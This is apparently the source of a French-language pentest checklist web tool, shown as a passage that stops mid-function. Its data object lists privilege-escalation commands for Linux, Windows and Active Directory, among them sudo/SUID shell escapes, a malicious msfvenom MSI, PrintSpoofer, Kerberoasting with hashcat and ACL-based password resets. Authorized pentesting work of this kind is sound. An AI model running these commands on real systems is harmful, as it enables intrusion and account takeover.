// Supposer que CHECKLIST_DEFINITION est disponible (soit défini ici, soit importé)
// Exemple simplifié de CHECKLIST_DEFINITION (voir section 2 pour plus de détails)
const CHECKLIST_DEFINITION = {
    'Linux': {
        'Permissions': [
            {
                id: 'linux-sudo-l',
                label: 'Vérifier les droits sudo',
                description: 'Analyser la sortie de `sudo -l` pour identifier les commandes exécutables sans mot de passe (NOPASSWD) ou les binaires exploitables (GTFOBins).',
                checkCommand: 'sudo -l',
                exploitationCommand: '# Si NOPASSWD sur /usr/bin/find:\nsudo find . -exec /bin/sh \\; -quit\n# Autres exemples GTFOBins:\nsudo bash -p\nsudo perl -e \'exec "/bin/sh";\'\nsudo python -c \'import os; os.system("/bin/sh")\'',
                links: [{ name: 'GTFOBins (sudo)', url: 'https://gtfobins.github.io/#+sudo' }],
                tips: 'Rechercher (ALL : ALL) NOPASSWD: ALL ou des binaires spécifiques. Tester différentes variations des commandes GTFOBins.',
                tags: ['sudo', 'permissions', 'gtfobins']
            },
            {
                id: 'linux-suid',
                label: 'Rechercher les binaires SUID',
                description: 'Identifier les exécutables SUID suspects ou connus pour être exploitables.',
                checkCommand: 'find / -type f -perm -4000 -ls 2>/dev/null',
                exploitationCommand: '# Si /usr/bin/find est SUID:\n./find . -exec /bin/sh -p \\; -quit\n# Exemples courants:\nnmap --interactive\nvi -E\nmore /etc/shadow # Si les permissions le permettent après exploitation',
                links: [{ name: 'GTFOBins (SUID)', url: 'https://gtfobins.github.io/#+suid' }],
                tips: 'Comparer la liste avec une liste standard. Vérifier les binaires dans /tmp ou /home. Utiliser `strings` sur les binaires suspects.',
                tags: ['suid', 'permissions', 'binaries', 'gtfobins']
            },
            {
                id: 'linux-capabilities',
                label: 'Vérifier les capacités de fichiers',
                description: 'Les capacités (file capabilities) permettent à des exécutables d\'effectuer des actions privilégiées sans être SUID. Identifier ceux qui pourraient être abusés.',
                checkCommand: 'getcap -r / 2>/dev/null',
                exploitationCommand: '# Si cap_setuid+ep sur python:\nsetuid() { /bin/sh; }; setuid\n# Si cap_dac_override+ep sur un binaire:\n./vulnerable_binary /etc/shadow',
                links: [{ name: 'Linux Capabilities', url: 'https://man7.org/linux/man-pages/man7/capabilities.7.html' }, { name: 'GTFOBins (Capabilities)', url: 'https://gtfobins.github.io/#+capabilities' }],
                tips: 'Se concentrer sur les capacités `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_sys_admin`.',
                tags: ['capabilities', 'permissions']
            }
        ],
        'System Info': [
             {
                id: 'linux-kernel-version',
                label: 'Vérifier la version du noyau',
                description: 'Identifier la version du noyau et rechercher des exploits connus (ex: Dirty COW, Dirty Pipe).',
                checkCommand: 'uname -a',
                exploitationCommand: '# Rechercher exploit sur exploit-db ou searchsploit\nsearchsploit Linux Kernel <version>\n# Compiler et exécuter l\'exploit approprié.',
                links: [{ name: 'Exploit-DB', url: 'https://www.exploit-db.com/' }],
                tips: 'Utiliser des outils comme linux-exploit-suggester, les scripts AutoRecon ou les scanners d\'énumération locaux (LES).',
                tags: ['kernel', 'exploit', 'system']
            },
            {
                id: 'linux-os-release',
                label: 'Vérifier les informations de distribution',
                description: 'Obtenir des informations plus détaillées sur la distribution Linux, ce qui peut aider à cibler des exploits spécifiques.',
                checkCommand: 'cat /etc/os-release',
                exploitationCommand: '# Rechercher des vulnérabilités spécifiques à la distribution et à sa version.',
                links: [],
                tips: 'Combiner avec la version du noyau pour une recherche d\'exploits plus précise.',
                tags: ['os', 'system']
            },
            {
                id: 'linux-environment-variables',
                label: 'Examiner les variables d\'environnement',
                description: 'Certaines variables d\'environnement peuvent révéler des informations sensibles (chemins, configurations) ou être exploitées.',
                checkCommand: 'env',
                exploitationCommand: '# Exemple d\'abus de PATH si SUID:\nexport PATH=/tmp:$PATH\necho \'#!/bin/sh\' > /tmp/evil.sh\nchmod +x /tmp/evil.sh\n./suid_vulnerable_binary',
                links: [],
                tips: 'Rechercher des chemins non standard dans PATH, des variables contenant des mots de passe ou des informations d\'identification.',
                tags: ['environment', 'configuration']
            }
        ],
        'Applications & Services': [
            {
                id: 'linux-world-writable-files',
                label: 'Rechercher les fichiers inscriptibles par tous',
                description: 'Identifier les fichiers ou dossiers avec des permissions 777 qui pourraient être exploités pour placer des backdoors ou modifier des fichiers de configuration.',
                checkCommand: 'find / -perm -o=w -type f 2>/dev/null',
                exploitationCommand: '# Écrire un backdoor dans un fichier cron ou un script de démarrage.',
                links: [],
                tips: 'Se concentrer sur les fichiers importants dans /etc, les scripts de démarrage, les fichiers cron.',
                tags: ['permissions', 'files']
            },
            {
                id: 'linux-writable-config-files',
                label: 'Rechercher les fichiers de configuration inscriptibles par l\'utilisateur courant',
                description: 'Identifier les fichiers de configuration appartenant à d\'autres utilisateurs ou root mais inscriptibles par l\'utilisateur actuel, ce qui pourrait permettre une prise de contrôle.',
                checkCommand: 'find /etc -type f -user root -writable -not -perm -g+w 2>/dev/null',
                exploitationCommand: '# Modifier /etc/passwd pour ajouter un nouvel utilisateur root (avec shadow).\n# Modifier des fichiers de configuration de services pour exécuter des commandes arbitraires.',
                links: [],
                tips: 'Être prudent lors de la modification de fichiers de configuration système.',
                tags: ['permissions', 'files', 'configuration']
            },
            {
                id: 'linux-mounted-devices',
                label: 'Examiner les périphériques montés',
                description: 'Identifier les périphériques montés (clés USB, partages réseau) qui pourraient contenir des informations sensibles ou être utilisés comme point d\'entrée.',
                checkCommand: 'mount',
                exploitationCommand: '# Examiner le contenu des périphériques montés.',
                links: [],
                tips: 'Vérifier les options de montage (noexec, nosuid).',
                tags: ['system', 'storage']
            },
            {
                id: 'linux-scheduled-tasks',
                label: 'Vérifier les tâches planifiées (Cron)',
                description: 'Lister les tâches cron de l\'utilisateur actuel et les tâches système qui pourraient être exploitables si l\'utilisateur a des droits d\'écriture sur les scripts exécutés.',
                checkCommand: 'crontab -l; cat /etc/crontab; find /etc/cron.* /var/spool/cron -type f 2>/dev/null',
                exploitationCommand: '# Si l\'utilisateur a le droit d\'écrire dans un script cron exécuté en tant que root, ajouter une commande de reverse shell.',
                links: [],
                tips: 'Vérifier les permissions des scripts mentionnés dans les fichiers cron.',
                tags: ['scheduled tasks', 'cron']
            },
            {
                id: 'linux-path-hijacking',
                label: 'Potentiel de détournement de PATH',
                description: 'Identifier les situations où des binaires privilégiés sont appelés sans chemin absolu et où l\'utilisateur actuel pourrait créer un exécutable malveillant avec le même nom dans un répertoire présent plus tôt dans la variable PATH.',
                checkCommand: 'ps aux | grep -v grep | awk \'{print $1, $11}\' | grep -v \'\[\' | while read user command; do if [[ "$command" != /* ]]; then which "$command"; fi; done',
                exploitationCommand: '# Créer un exécutable malveillant dans un répertoire listé avant le répertoire légitime dans PATH.',
                links: [],
                tips: 'Analyser les scripts et les binaires SUID/SGID.',
                tags: ['path', 'binaries']
            }
        ]
    },
    'Windows': {
        'Permissions & Privileges': [
            {
                id: 'win-whoami-priv',
                label: 'Vérifier les privilèges du token',
                description: 'Analyser `whoami /priv` pour les privilèges sensibles activés (SeImpersonate, SeBackup, SeDebug...).',
                checkCommand: 'whoami /priv',
                exploitationCommand: '# Si SeImpersonate:\n# Utiliser JuicyPotatoNG, PrintSpoofer...\nPrintSpoofer.exe -i -c cmd\n# Si SeBackupPrivilege:\n# Utiliser NTBackupHacker, ShadowCopy...',
                links: [{ name: 'HackTricks (Token Privs)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-privileges' }],
                tips: 'SeImpersonate/SeAssignPrimaryToken sont souvent exploitables pour usurper l\'identité d\'autres utilisateurs/systèmes. SeBackupPrivilege peut permettre de lire des fichiers protégés (SAM, Registry).',
                tags: ['privileges', 'token', 'whoami']
            },
             {
                id: 'win-alwaysinstallelevated',
                label: 'Vérifier AlwaysInstallElevated',
                description: 'Vérifier si les clés de registre AlwaysInstallElevated sont activées (valeur 1), permettant l\'installation de MSI avec les privilèges SYSTEM.',
                checkCommand: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
                exploitationCommand: '# Si les deux clés sont à 1:\nmsfvenom -p windows/x64/exec CMD=cmd.exe -f msi -o malicious.msi\nmsiexec /i malicious.msi /quiet',
                links: [{ name: 'HackTricks (AlwaysInstallElevated)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated' }],
                tips: 'Les deux clés (HKLM et HKCU) doivent être à 1 pour que l\'exploit fonctionne.',
                tags: ['registry', 'msi', 'configuration']
            },
            {
                id: 'win-uac-bypass',
                label: 'Rechercher les vulnérabilités de contournement UAC',
                description: 'Identifier les méthodes connues pour contourner le User Account Control (UAC) et exécuter du code avec des privilèges élevés.',
                checkCommand: '# Vérifier les configurations UAC (Regedit: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA)\n# Rechercher des binaires auto-élevés qui peuvent être abusés (voir GTFOBins).',
                exploitationCommand: '# Utiliser des outils comme UACMe, Metasploit modules (exploit/windows/local/bypass_uac...).',
                links: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }, { name: 'GTFOBins (UAC Bypass)', url: 'https://gtfobins.github.io/#+uac' }],
                tips: 'Le niveau de UAC configuré influence les méthodes de contournement possibles.',
                tags: ['uac', 'bypass', 'privileges']
            },
            {
                id: 'win-auto-elevated-binaries',
                label: 'Abus des binaires auto-élevés',
                description: 'Certains binaires Windows sont configurés pour s\'exécuter automatiquement avec des privilèges élevés. Si l\'utilisateur actuel a des droits d\'écriture sur ces binaires ou leurs dépendances, cela peut être exploité.',
                checkCommand: '# Rechercher les binaires avec l\'attribut "AutoElevate" (peut nécessiter des outils spécifiques).',
                exploitationCommand: '# Remplacer le binaire légitime par un binaire malveillant.',
                links: [{ name: 'HackTricks (AutoElevate)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#auto-elevate-binaries' }],
                tips: 'Identifier les binaires dans des chemins inscriptibles par l\'utilisateur.',
                tags: ['binaries', 'privileges']
            }
        ],
        'Credentials': [
             {
                id: 'win-unattend',
                label: 'Rechercher les fichiers Unattend.xml',
                description: 'Chercher des fichiers de configuration d\'installation automatique (Unattend.xml, sysprep.xml) qui peuvent contenir des mots de passe en clair ou encodés.',
                checkCommand: 'dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml',
                exploitationCommand: '# Ouvrir le fichier trouvé et chercher les sections <Password> ou <Credentials>.\n# Tenter de décoder les mots de passe Base64.',
                links: [{ name: 'HackTricks (Unattend)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unattend-files' }],
                tips: 'Les mots de passe peuvent être en Base64. Ces fichiers peuvent se trouver dans des répertoires temporaires ou de sauvegarde.',
                tags: ['credentials', 'files', 'configuration']
            },
            {
                id: 'win-registry-credentials',
                label: 'Rechercher les informations d\'identification dans le Registre',
                description: 'Certaines applications stockent des informations d\'identification (mots de passe, clés API) dans le Registre Windows.',
                checkCommand: 'reg query HKLM /s /f "password" /t REG_SZ /e && reg query HKCU /s /f "password" /t REG_SZ /e',
                exploitationCommand: '# Examiner les clés de registre trouvées pour des informations sensibles.',
                links: [],
                tips: 'Utiliser des outils comme RegRipper pour une analyse plus approfondie du Registre.',
                tags: ['credentials', 'registry']
            },
            {
                id: 'win-service-permissions',
                label: 'Analyser les permissions des services',
                description: 'Vérifier les permissions sur les services Windows. Un utilisateur avec des droits de modification sur un service peut potentiellement l\'utiliser pour exécuter du code avec des privilèges SYSTEM.',
                checkCommand: 'sc qc <nom_du_service> && icacls "C:\\Program Files\\<chemin_du_service>\\<executable_du_service>.exe"',
                exploitationCommand: '# Si l\'utilisateur a des droits de modification (WRITE) sur le binaire du service, le remplacer par un exécutable malveillant et redémarrer le service.\n# Si l\'utilisateur a des droits de modification de la configuration du service, changer le binaire à exécuter.',
                links: [{ name: 'HackTricks (Service Permissions)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#weak-service-permissions' }],
                tips: 'Utiliser des outils comme AccessChk de Sysinternals pour analyser les permissions.',
                tags: ['services', 'permissions']
            },
            {
                id: 'win-alwayson-vpn-credentials',
                label: 'Rechercher les informations d\'identification Always On VPN',
                description: 'Les configurations Always On VPN peuvent stocker des informations d\'identification dans le Registre ou des fichiers de configuration.',
                checkCommand: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\RasMan\\Config /s /f "Password" /t REG_SZ /e && dir /s /b C:\\ProgramData\\Microsoft\\Network\\Connections\\Pbk\\*.pbk',
                exploitationCommand: '# Examiner les clés de registre et les fichiers .pbk pour des informations sensibles.',
                links: [],
                tips: 'Les mots de passe peuvent être encodés.',
                tags: ['credentials', 'vpn', 'registry', 'files']
            }
        ],
        'System Info': [
            {
                id: 'win-os-version',
                label: 'Vérifier la version du système d\'exploitation',
                description: 'Identifier la version de Windows et le niveau de patch pour rechercher des exploits spécifiques.',
                checkCommand: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(es)"',
                exploitationCommand: '# Rechercher des exploits locaux sur Exploit-DB ou via des outils comme Windows Exploit Suggester (WES).',
                links: [{ name: 'Windows Exploit Suggester', url: 'https://github.com/bitsadmin/wesng' }, { name: 'Exploit-DB', url: 'https://www.exploit-db.com/' }],
                tips: 'Comparer les hotfixes installés avec les CVE connues.',
                tags: ['os', 'system', 'exploit']
            },
            {
                id: 'win-environment-variables',
                label: 'Examiner les variables d\'environnement',
                description: 'Certaines variables d\'environnement peuvent révéler des informations sensibles ou des chemins potentiellement exploitables.',
                checkCommand: 'set',
                exploitationCommand: '# Rechercher des chemins non standard dans PATH qui pourraient être détournés.',
                links: [],
                tips: 'Faire attention aux chemins contenant des espaces (nécessitent des guillemets pour l\'exécution).',
                tags: ['environment', 'configuration']
            },
            {
                id: 'win-installed-applications',
                label: 'Lister les applications installées',
                description: 'Identifier les applications vulnérables ou mal configurées qui pourraient être exploitées pour une élévation de privilèges.',
                checkCommand: 'wmic product get Name, Version',
                exploitationCommand: '# Rechercher des vulnérabilités connues pour les versions spécifiques des applications installées.',
                links: [],
                tips: 'Se concentrer sur les applications avec des privilèges élevés ou celles qui s\'exécutent en tant que service.',
                tags: ['applications', 'vulnerabilities']
            }
        ],
        'Scheduled Tasks': [
            {
                id: 'win-scheduled-tasks',
                label: 'Analyser les tâches planifiées',
                description: 'Lister les tâches planifiées et vérifier les permissions associées. Si l\'utilisateur a des droits d\'écriture sur le binaire ou le script exécuté par une tâche avec des privilèges élevés, cela peut être exploité.',
                checkCommand: 'schtasks /query /fo LIST /v',
                exploitationCommand: '# Si l\'utilisateur a des droits de modification sur le fichier exécuté par une tâche privilégiée, le remplacer par un payload malveillant.',
                links: [{ name: 'HackTricks (Scheduled Tasks)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks' }],
                tips: 'Vérifier la colonne "Run As User" et les permissions du fichier exécuté.',
                tags: ['scheduled tasks']
            }
        ]
    },
    'Active Directory': {
        'Kerberos': [
            {
                id: 'ad-kerberoasting',
                label: 'Kerberoasting',
                description: 'Identifier les comptes utilisateurs (non-machine) configurés avec un SPN. Le hash Kerberos TGS pour ces comptes peut être demandé et cracké offline pour obtenir le mot de passe du compte de service.',
                checkCommand: '# PowerShell (AD Module):\nGet-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName\n\n# Rubeus:\nRubeus.exe kerberoast /outfile:hashes.kerberoast',
                exploitationCommand: '# Cracker le hash avec hashcat ou john:\nhashcat -m 13100 hashes.kerberoast /path/to/wordlist.txt',
                links: [{ name: 'HackTricks (Kerberoasting)', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting' }],
                tips: 'Cibler les comptes de service avec des privilèges élevés. Utiliser des outils comme SharpHound pour identifier facilement les SPNs.',
                tags: ['kerberos', 'ad', 'credentials', 'cracking']
            },
            {
                id: 'ad-asreproasting',
                label: 'AS-REP Roasting',
                description: 'Identifier les comptes utilisateurs pour lesquels l\'attribut "Do not require Kerberos preauthentication" est activé. Le hash Kerberos AS-REP (TGT) de ces comptes peut être demandé sans authentification préalable et cracké offline.',
                checkCommand: '# PowerShell (AD Module):\nGet-ADUser -Filter {\'DontRequirePreAuth\' -eq $true} -Properties SamAccountName\n\n# Rubeus:\nRubeus.exe asreproast /outfile:hashes.asreproast /format:hashcat',
                exploitationCommand: '# Cracker le hash avec hashcat ou john:\nhashcat -m 18200 hashes.asreproast /path/to/wordlist.txt\n# Utiliser Rubeus pour demander le TGT et l\'exporter.',
                links: [{ name: 'HackTricks (AS-REP Roasting)', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/as-rep-roasting' }],
                tips: 'Souvent utile pour obtenir un premier accès si un compte utilisateur est vulnérable. Utiliser SharpHound pour visualiser ces relations.',
                tags: ['kerberos', 'ad', 'credentials', 'cracking', 'preauth']
            }
        ],
        'ACLs & Permissions': [
             {
                id: 'ad-acls-genericall',
                label: 'ACLs - GenericAll/WriteDACL sur Objets Privilégiés',
                description: 'Rechercher si votre utilisateur actuel (ou un groupe auquel il appartient) possède des droits de modification étendus (GenericAll, WriteDACL, WriteOwner) sur des objets sensibles (comptes admin, groupes privilégiés, objets GPO, l\'objet Domain).',
                checkCommand: '# BloodHound est l\'outil principal pour analyser les ACLs.\n# PowerView (Exemple pour le groupe Domain Admins):\nGet-ObjectAcl -ResolveGUIDs -Identity "Domain Admins"',
                exploitationCommand: '# Si WriteDACL sur un groupe, s\'ajouter au groupe:\nAdd-ADGroupMember -Identity "Target Group" -Members "Your User"\n\n# Si GenericAll sur un utilisateur, reset son mot de passe:\nSet-ADAccountPassword -Identity "Target User" -NewPassword (ConvertTo-SecureString "NewP@ssw0rd1" -AsPlainText -Force) -Reset\n\n# Si WriteOwner sur un objet, en prendre possession et modifier les ACLs.',
                links: [{ name: 'HackTricks (ACL Abuse)', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse' }],
                tips: 'Utiliser BloodHound pour visualiser les chemins d\'attaque basés sur les ACLs. Les droits WriteDACL et WriteOwner sont particulièrement critiques.',
                tags: ['ad', 'acl', 'permissions', 'bloodhound', 'genericall', 'writedacl', 'writeowner']
            },
            {
                id: 'ad-gpo-abuse',
                label: 'Abus des GPOs (Group Policy Objects)',
                description: 'Si un utilisateur a des droits de modification sur une GPO liée à une OU contenant des ordinateurs ou des utilisateurs cibles, il peut modifier la GPO pour exécuter des commandes arbitraires avec les privilèges SYSTEM sur ces machines ou dans le contexte de ces utilisateurs.',
                checkCommand: '# BloodHound peut identifier les relations de contrôle sur les GPOs.\n# PowerShell (AD Module):\nGet-GPO -Name "Nom de la GPO" | Get-GPPermission -All',
                exploitationCommand: '# Modifier une GPO pour créer une tâche planifiée qui exécute un payload malveillant sur les machines cibles (Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks).\n# Modifier les scripts de démarrage (Computer Configuration -> Windows Settings -> Scripts (Startup/Shutdown)).',
                links: [{ name: 'HackTricks (GPO Abuse)', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/group-policy-objects-gpos-and-privilege-escalation' }],
                tips: 'Les GPOs liées aux OUs de haut niveau (Domain Controllers) sont des cibles de grande valeur.',
                tags: ['ad', 'gpo', 'permissions']
            }
        ],
        'Trusts': [
            {
                id: 'ad-trust-abuse',
                label: 'Abus des relations d\'approbation (Trusts)',
                description: 'Si un domaine Active Directory a des relations d\'approbation avec d\'autres domaines, il peut être possible d\'abuser de ces relations pour obtenir un accès privilégié dans le domaine actuel ou les domaines approuvés.',
                checkCommand: '# PowerShell (AD Module):\nGet-ADTrust -Filter *',
                exploitationCommand: '# Utiliser des outils comme Mimikatz (s4u, ptt) pour générer des tickets inter-domaines si des SID History sont présents ou si des vulnérabilités d\'approbation existent.',
                links: [{ name: 'HackTricks (Trust Abuse)', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/trusts-attacks' }],
                tips: 'Identifier le type de relation d\'approbation (one-way, two-way, transitive, non-transitive).',
                tags: ['ad', 'trusts', 'mimikatz']
            }
        ]
    }
    // Ajouter d'autres OS si nécessaire, ex: 'macOS', 'Generic Unix'
};

document.addEventListener('DOMContentLoaded', () => {
    console.log("Privesc Refactored Initializing...");

    // Références DOM
    const nodeSelect = document.getElementById('node-select');
    const activeNodeInfo = document.getElementById('active-node-info');
    const checklistContainer = document.getElementById('checklist-container');
    const checklistPlaceholder = document.getElementById('checklist-placeholder');
    const checklistSearchInput = document.getElementById('checklist-search');
    const checklistFilterStatus = document.getElementById('checklist-filter-status');
    const checklistFilterTag = document.getElementById('checklist-filter-tag');
    const applyFiltersBtn = document.getElementById('apply-checklist-filters');
    const checklistItemTemplate = document.getElementById('checklist-item-template');

    // Variables d'état
    let hostManagerData = null;
    let currentNodeId = null;
    let checklistState = {}; // { nodeId: { itemId: { status: 'todo', notes: '' }, ... } }
    let availableTags = new Set();

    // --- Initialisation ---
    async function initialize() {
        console.log("Initializing Privesc Tool...");
        loadHostManagerData();
        populateNodeSelector();
        loadChecklistStateFromStorage(); // Charger l'état global

        // Écouteurs d'événements
        nodeSelect.addEventListener('change', handleNodeSelection);
        applyFiltersBtn.addEventListener('click', applyFilters);
        checklistSearchInput.addEventListener('keyup', (event) => {
             if (event.key === 'Enter') applyFilters();
        });
        // Utiliser la délégation d'événements pour les items de checklist
        checklistContainer.addEventListener('change', handleChecklistInteraction);
        checklistContainer.addEventListener('input', handleChecklistInteraction); // Pour les textareas
        checklistContainer.addEventListener('click', handleChecklistInteraction); // Pour les boutons copier

        console.log("Privesc Tool Initialized.");
    }

    // --- Chargement des Données HostManager ---
    function loadHostManagerData() {
        try {
            const storedData = localStorage.getItem('pentestHostData_v2');
            if (storedData) {
                hostManagerData = JSON.parse(storedData);
                console.log("HostManager data loaded successfully:", hostManagerData);
            } else {
                console.warn("No HostManager data found in localStorage.");
                hostManagerData = { categories: {}, edges: [] }; // Initialiser vide
                nodeSelect.innerHTML = '<option value="">Aucune donnée HostManager trouvée</option>';
            }
        } catch (error) {
            console.error("Error loading or parsing HostManager data:", error);
            hostManagerData = { categories: {}, edges: [] };
            nodeSelect.innerHTML = '<option value="">Erreur chargement données</option>';
            activeNodeInfo.textContent = 'Erreur chargement données HostManager.';
        }
    }

    // --- Peuplement du Sélecteur de Node ---
    function populateNodeSelector() {
        if (!hostManagerData || Object.keys(hostManagerData.categories).length === 0) {
             nodeSelect.innerHTML = '<option value="">Aucun node défini dans HostManager</option>';
             return;
        }

        nodeSelect.innerHTML = '<option value="">-- Sélectionner un Node --</option>';
        let nodeCount = 0;
        for (const categoryName in hostManagerData.categories) {
            const category = hostManagerData.categories[categoryName];
            if (category.hosts) {
                for (const hostId in category.hosts) {
                    const host = category.hosts[hostId];
                    const option = document.createElement('option');
                    option.value = hostId;
                    // Afficher plus d'infos si disponibles
                    let displayText = hostId;
                    if (host.system) displayText += ` (${host.system})`;
                    if (host.role) displayText += ` - ${host.role}`;
                    option.textContent = displayText;
                    option.dataset.category = categoryName; // Stocker la catégorie
                    nodeSelect.appendChild(option);
                    nodeCount++;
                }
            }
        }
        console.log(`Populated node selector with ${nodeCount} nodes.`);
    }

    // --- Sélection d'un Node ---
    function handleNodeSelection() {
        currentNodeId = nodeSelect.value;
        if (!currentNodeId) {
            activeNodeInfo.textContent = 'Sélectionnez un node...';
            checklistContainer.innerHTML = ''; // Vider la checklist
            checklistPlaceholder.style.display = 'block';
            return;
        }

        const selectedOption = nodeSelect.options[nodeSelect.selectedIndex];
        const categoryName = selectedOption.dataset.category;
        const nodeData = hostManagerData?.categories?.[categoryName]?.hosts?.[currentNodeId];

        if (!nodeData) {
            console.error(`Node data not found for ID: ${currentNodeId} in category: ${categoryName}`);
            activeNodeInfo.textContent = `Erreur: Données introuvables pour ${currentNodeId}`;
            checklistContainer.innerHTML = '';
            checklistPlaceholder.textContent = `Erreur: Données introuvables pour ${currentNodeId}`;
            checklistPlaceholder.style.display = 'block';
            return;
        }

        console.log(`Node selected: ${currentNodeId}`, nodeData);
        updateActiveNodeInfo(nodeData);
        renderChecklistForNode(nodeData);
        applyFilters(); // Appliquer les filtres actuels à la nouvelle checklist
    }

    // --- Mise à jour Infos Node Actif ---
    function updateActiveNodeInfo(nodeData) {
        let info = `OS: ${nodeData.system || 'N/A'} | `;
        info += `Rôle: ${nodeData.role || 'N/A'} | `;
        info += `Zone: ${nodeData.zone || 'N/A'} | `;
        info += `Compromission: ${nodeData.compromiseLevel || 'None'} | `;
        info += `Tags: ${(nodeData.tags || []).join(', ') || 'Aucun'}`;
        activeNodeInfo.textContent = info;
    }

    // --- Rendu de la Checklist ---
    function renderChecklistForNode(nodeData) {
        checklistContainer.innerHTML = ''; // Vider l'ancien contenu
        checklistPlaceholder.style.display = 'none';
        availableTags.clear(); // Réinitialiser les tags pour ce node

        const os = detectOS(nodeData.system); // Fonction à affiner
        const definitionForOS = CHECKLIST_DEFINITION[os];

        if (!definitionForOS) {
            checklistPlaceholder.textContent = `Aucune checklist définie pour l'OS détecté: ${os || 'Inconnu'}`;
            checklistPlaceholder.style.display = 'block';
            populateTagFilter(); // Mettre à jour le filtre de tags (vide)
            return;
        }

        let itemsRendered = 0;
        for (const category in definitionForOS) {
            // Optionnel: Ajouter un titre de catégorie
            // const categoryTitle = document.createElement('h5');
            // categoryTitle.textContent = category;
            // categoryTitle.classList.add('mt-3', 'mb-2', 'text-primary');
            // checklistContainer.appendChild(categoryTitle);

            definitionForOS[category].forEach(item => {
                const itemElement = createChecklistItemElement(item, nodeData);
                checklistContainer.appendChild(itemElement);
                itemsRendered++;
                // Collecter les tags
                (item.tags || []).forEach(tag => availableTags.add(tag));
            });
        }

        if (itemsRendered === 0) {
             checklistPlaceholder.textContent = `Aucun item de checklist trouvé pour l'OS: ${os}`;
             checklistPlaceholder.style.display = 'block';
        }

        populateTagFilter(); // Mettre à jour le filtre de tags
        loadChecklistStateForNode(currentNodeId); // Charger l'état spécifique à ce node
        console.log(`Rendered ${itemsRendered} checklist items for node ${currentNodeId} (OS: ${os})`);
    }

    // --- Création d'un Élément de Checklist (depuis Template) ---
    function createChecklistItemElement(itemData, nodeData) {
        const templateClone = checklistItemTemplate.content.cloneNode(true);
        const itemElement = templateClone.querySelector('.checklist-item');

        itemElement.dataset.itemId = itemData.id;
        itemElement.dataset.tags = (itemData.tags || []).join(',');

        itemElement.querySelector('.checklist-label').textContent = itemData.label;
        itemElement.querySelector('.checklist-description').textContent = itemData.description;

        // Commandes
        const checkCmdElement = itemElement.querySelector('.check-command code');
        const checkCmdContainer = itemElement.querySelector('.check-command');
        if (itemData.checkCommand) {
            checkCmdElement.textContent = itemData.checkCommand;
            checkCmdContainer.style.display = 'block';
        } else {
             checkCmdContainer.style.display = 'none';
        }

        const exploitCmdElement = itemElement.querySelector('.exploit-command code');
        const exploitCmdContainer = itemElement.querySelector('.exploit-command');
        if (itemData.exploitationCommand) {
            exploitCmdElement.textContent = itemData.exploitationCommand;
            exploitCmdContainer.style.display = 'block';
        } else {
            exploitCmdContainer.style.display = 'none';
        }

        // Liens
        const linksContainer = itemElement.querySelector('.checklist-links');
        if (itemData.links && itemData.links.length > 0) {
            const linksList = document.createElement('p');
            itemData.links.forEach(link => {
                const a = document.createElement('a');
                a.href = link.url;
                a.textContent = link.name;
                a.target = '_blank'; // Ouvrir dans un nouvel onglet
                a.rel = 'noopener noreferrer';
                a.classList.add('me-2');
                linksList.appendChild(a);
            });
            linksContainer.appendChild(linksList);
            linksContainer.style.display = 'block';
        } else {
             linksContainer.style.display = 'none';
        }

        // Astuces
        const tipsContainer = itemElement.querySelector('.checklist-tips');
        const tipsParagraph = tipsContainer.querySelector('p');
        if (itemData.tips) {
            tipsParagraph.textContent = itemData.tips;
            tipsContainer.style.display = 'block';
        } else {
            tipsContainer.style.display = 'none';
        }

        // Ajouter l'ID de l'item aux data-attributes du select et textarea pour identification facile
        itemElement.querySelector('.checklist-status-select').dataset.itemId = itemData.id;
        itemElement.querySelector('.checklist-notes-textarea').dataset.itemId = itemData.id;
        itemElement.querySelectorAll('.copy-btn-inline').forEach(btn => btn.dataset.itemId = itemData.id);


        return itemElement;
    }

    // --- Détection OS (Simpliste) ---
    function detectOS(systemString) {
        if (!systemString) return 'Linux'; // Défaut ? Ou 'Unknown' ?
        const lowerSystem = systemString.toLowerCase();
        if (lowerSystem.includes('linux')) return 'Linux';
        if (lowerSystem.includes('windows')) return 'Windows';
        if (lowerSystem.includes('domain controller')) return 'Active Directory'; // Ou combiner avec Windows ?
        // Ajouter d'autres détections (macOS, BSD, etc.)
        return 'Linux'; // Retour à un défaut
    }

    // --- Gestion des Interactions Checklist ---
    function handleChecklistInteraction(event) {
        const target = event.target;
        const itemId = target.dataset.itemId;

        if (!currentNodeId || !itemId) return; // Pas de node sélectionné ou item non identifié

        // Changement de Statut
        if (target.matches('.checklist-status-select')) {
            const newStatus = target.value;
            updateChecklistItemState(currentNodeId, itemId, { status: newStatus });
            // Appliquer la classe de style au parent
            const itemElement = target.closest('.checklist-item');
            if (itemElement) {
                 itemElement.classList.remove('status-checked', 'status-exploitable', 'status-exploited');
                 if (newStatus !== 'todo') {
                     itemElement.classList.add(`status-${newStatus}`);
                 }
            }
        }
        // Saisie de Notes
        else if (target.matches('.checklist-notes-textarea')) {
            // Utiliser un debounce serait mieux pour les perfs, mais simple pour l'instant
             updateChecklistItemState(currentNodeId, itemId, { notes: target.value });
        }
        // Bouton Copier
        else if (target.matches('.copy-btn-inline') || target.closest('.copy-btn-inline')) {
